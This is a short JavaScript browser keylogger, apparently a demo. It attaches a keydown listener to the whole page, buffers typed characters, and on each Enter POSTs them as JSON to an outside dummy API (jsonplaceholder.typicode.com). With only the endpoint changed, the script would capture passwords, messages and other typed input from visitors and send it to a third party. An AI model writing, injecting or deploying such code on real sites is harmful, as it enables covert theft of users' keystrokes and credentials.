// Send dummy post request to JSONPlaceholder API.
// See https://jsonplaceholder.typicode.com/ for more information.
function sendLoggedInput(loggedInput) {
  // Dummy data to send to the dummy api
  const dummyData = {
    title: 'Input to log',
    body: loggedInput,
    userId: 1,
  };

  const jsonData = JSON.stringify(dummyData);

  const xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://jsonplaceholder.typicode.com/posts', true);

  // Send JSON data
  xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');

  xhr.onload = function () {
    // Request finished
    if (xhr.status >= 200 && xhr.status < 300) {
      const response = JSON.parse(xhr.responseText);
      console.log('Response:', response);
    }
  };

  xhr.onerror = function (eventError) {
    console.error(eventError);
  };

  xhr.send(jsonData);
}

if (document.readyState === 'complete') {
  let logInputs = '';

  document.addEventListener('keydown', function (event) {
    if (event.key === 'Enter') {
      sendLoggedInput(logInputs);
      logInputs = '';
      return;
    }

    // Only want to log alphanumeric keys and special characters
    const isValidKey = /^[a-zA-Z0-9.,!?;:'"()&%$#@+\s]$/.test(event.key);

    if (isValidKey) {
      logInputs += event.key;
    }
  });
}
